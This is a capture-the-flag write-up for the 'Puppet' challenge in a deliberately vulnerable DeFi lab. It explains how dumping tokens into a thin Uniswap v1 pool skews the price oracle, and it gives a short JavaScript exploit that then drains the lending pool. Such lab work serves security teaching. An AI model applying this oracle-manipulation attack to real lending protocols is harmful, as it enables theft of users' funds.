# CHALLENGE #8 - Puppet
There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There's a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool. 

## Manipulation of uniswap price
In order to be able to drain the lending pool contract we have to manipulate the amount of eth balance in the uniswap contract so we can borrow a big amount of DVT Tokens
with a very small deposit required.      
We can do that by exchanging a bunch of DVT tokens for 1 eth in order to make the eth balance as close to 0 as possible, so we can drain the lending pool contract.      

## Exploit
```js
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await this.token.connect(attacker).approve(
            this.uniswapExchange.address,
            ethers.utils.parseEther('1000'),
        );
		await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
            ethers.utils.parseEther('999'),
			ethers.utils.parseEther('1'),
			(await ethers.provider.getBlock('latest')).timestamp * 2,
		);
		await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: ethers.utils.parseEther('25')});
    });
```
